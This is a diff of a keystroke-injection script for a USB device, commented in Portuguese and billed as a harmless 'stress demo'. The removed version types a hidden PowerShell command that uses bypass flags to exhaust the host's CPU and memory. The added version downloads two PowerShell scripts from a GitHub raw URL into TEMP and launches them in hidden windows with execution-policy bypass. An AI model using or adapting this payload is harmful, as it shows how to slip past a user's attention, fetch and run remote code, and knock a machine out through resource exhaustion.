@@ -1,76 +1,54 @@
 REM ===============================================
-REM 🔥 PP_Tech Stealth Stress Test - ABNT2 BR 🔥
-REM Baseado nos scripts PowerShell LoadScripts
-REM Totalmente silencioso - apenas "Success!" no LCD
+REM Inofensivo - só stressa até reiniciar
 REM ===============================================
 
-REM Configuração inicial silenciosa
+KEYBOARD_LAYOUT win_pt-BR
+DELAY 1500
 LED_OFF
 DISPLAY_CLEAR
-DELAY 2000
 
-REM Apenas uma mensagem discreta no LCD
-DISPLAY_TEXT 20 30 PP_Tech
-DISPLAY_TEXT 15 50 Loading...
+REM Initial setup - LED vermelho
+DISPLAY_TEXT 10 20 PP_Tech Stress Demo
+DISPLAY_TEXT 15 35 Initializing...
+LED 255 0 0 200
+DELAY 1500
 
-REM Executar stress test totalmente silencioso
+REM Step 1 - Abrir PowerShell
 GUI r
+DELAY 500
+STRING powershell
+ENTER
 DELAY 1000
 
-REM PowerShell completamente oculto - baseado em loadcpu.ps1 + loadram.ps1
-STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
-DELAY 500
+REM Step 2 - Baixar scripts do GitHub RAW para o TEMP
+STRING iwr https://raw.githubusercontent.com/bob-reis/lilygo-payloads-demo/main/Scripts/loadram.ps1 -OutFile $env:TEMP\loadram.ps1
+ENTER
+DELAY 800
+STRING iwr https://raw.githubusercontent.com/bob-reis/lilygo-payloads-demo/main/Scripts/loadcpu.ps1 -OutFile $env:TEMP\loadcpu.ps1
+ENTER
+DELAY 800
 
-REM CPU Stress baseado em loadcpu.ps1 (stealth)
-STRING $cpus=$env:NUMBER_OF_PROCESSORS;
-DELAY 200
-STRING [System.Threading.Thread]::CurrentThread.Priority='Highest';
-DELAY 200
-STRING 1..$cpus|ForEach{Start-Job -ScriptBlock{$r=1;1..0x7FFFFFFF|ForEach{$r*=$_}}};
-DELAY 500
-
-REM RAM Stress baseado em loadram.ps1 (stealth)
-STRING $box=gwmi Win32_ComputerSystem;
-DELAY 200
-STRING $physMB=$box.TotalPhysicalMemory/1MB;
-DELAY 200
-STRING $maxRAM=$physMB-512;
-DELAY 200
-STRING $a='a'*200MB;
-DELAY 200
-STRING $growArray=@();$bigArray=@();$k=0;
-DELAY 200
-STRING while((($physMB-(gwmi Win32_PerfRawData_PerfOS_Memory).AvailableMBytes))-lt $maxRAM){
-DELAY 200
-STRING $bigArray+=,@($k,$growArray);$k++;$growArray+=$a};
-DELAY 500
-
-REM Disk I/O mínimo e stealth
-STRING 1..50|ForEach{('x'*1KB)|Out-File $env:TEMP\t$_.tmp -Encoding ASCII};
+REM Step 3 - Executar scripts em segundo plano (invisível)
+STRING Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File $env:TEMP\loadram.ps1" -WindowStyle Hidden
+ENTER
 DELAY 300
+STRING Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File $env:TEMP\loadcpu.ps1" -WindowStyle Hidden
+ENTER
+DELAY 500
 
-REM Auto-limpeza após 3 minutos
-STRING Start-Sleep 180;
-DELAY 200
-STRING Get-Job|Stop-Job;Get-Job|Remove-Job;
-DELAY 200
-STRING $bigArray=$null;$growArray=$null;[System.GC]::Collect();
-DELAY 200
-STRING Remove-Item $env:TEMP\t*.tmp -Force -EA 0;
-DELAY 200
-STRING exit"
+REM Step 4 - Fechar PowerShell (janela principal)
+STRING exit
 ENTER
 
-REM Aguardar 10 segundos e mostrar sucesso
-DELAY 10000
+REM Step 5 - Abrir Gerenciador de Tarefas
+GUI r
+DELAY 500
+STRING taskmgr
+ENTER
 
-REM Mostrar apenas "Success!" discretamente
+REM Step 6 - LED final verde
+DELAY 2000
+LED 0 255 0 200
 DISPLAY_CLEAR
-DISPLAY_TEXT 30 40 Success!
-LED 0 255 0 100
-
-REM Manter por 5 segundos e resetar silenciosamente
-DELAY 5000
-DISPLAY_CLEAR
-LED_OFF
-RESET
+DISPLAY_TEXT 10 20 Stress Demo Running
+DISPLAY_TEXT 5 40 Watch CPU & RAM in Task Manager
